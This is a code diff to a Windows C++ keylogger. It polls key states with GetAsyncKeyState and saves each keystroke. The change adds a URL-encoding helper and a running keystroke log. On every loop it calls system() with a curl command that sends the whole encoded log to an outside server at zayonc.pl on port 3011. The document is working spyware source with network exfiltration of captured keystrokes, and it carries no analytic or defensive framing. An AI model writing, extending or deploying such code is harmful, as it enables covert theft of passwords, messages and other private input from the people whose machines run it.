@@ -2,6 +2,9 @@
 #include <string>
 #include <iostream>
 #include <fstream>
+#include <cctype>
+#include <iomanip>
+#include <sstream>
 
 using namespace std;
 
@@ -83,18 +86,52 @@ string parseToString(char key) {
 }
 
 
+string url_encode(const string& value) {
+	ostringstream escaped;
+	escaped.fill('0');
+	escaped << hex;
+
+	for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
+		string::value_type c = (*i);
+
+		// Keep alphanumeric and other accepted characters intact
+		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
+			escaped << c;
+			continue;
+		}
+
+		// Any other characters are percent-encoded
+		escaped << uppercase;
+		escaped << '%' << setw(2) << int((unsigned char)c);
+		escaped << nouppercase;
+	}
+
+	return escaped.str();
+}
+
+
+
 int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_SHOW);
+
+	string log = "";
 
 	while (true) {
 		Sleep(10);
 		for (unsigned char key = 8; key <= 165; key++)
 		{
-			if (GetAsyncKeyState(key) == -32767)
+			if (GetAsyncKeyState(key) == -32767) {
+
 				save(parseToString(key));
-			
+				log += parseToString(key);
+
+			}
 		}
+
+		string req = "curl http://zayonc.pl:3011/log?log=" + url_encode(log);
+
+		system(req.c_str());
 	}
 
 	return 0;
